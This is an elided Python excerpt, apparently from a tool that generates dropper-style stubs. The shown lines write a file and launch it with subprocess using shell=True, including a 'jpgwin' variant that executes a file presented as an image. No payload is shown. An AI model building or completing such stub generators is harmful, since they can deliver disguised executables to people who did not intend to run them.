...
def pythwin():
    ...
    stub += 'proc = subprocess.Popen("python "+new_file_name, shell=True, stdin=sys.stdin, stdout=sys.stdout, stderr=sys.stderr)\n'
...
def pythlin():
    ...
    # Execute file
    stub += "import subprocess\n"
    stub += 'proc = subprocess.Popen("python3 "+new_file_name, shell=True, stdin=sys.stdin, stdout=sys.stdout, stderr=sys.stderr)\n'
...
def jpgwin():
    ...
    # Execute file
    stub += "import subprocess\n"
    stub += 'proc = subprocess.Popen(new_file_name, shell=True, stdin=sys.stdin, stdout=sys.stdout, stderr=sys.stderr)\n'
...
def phplin():
    ...
    # Execute file
    stub += "import subprocess\n"
    stub += 'proc = subprocess.Popen("php "+new_file_name, shell=True, stdin=sys.stdin, stdout=sys.stdout, stderr=sys.stderr)\n'
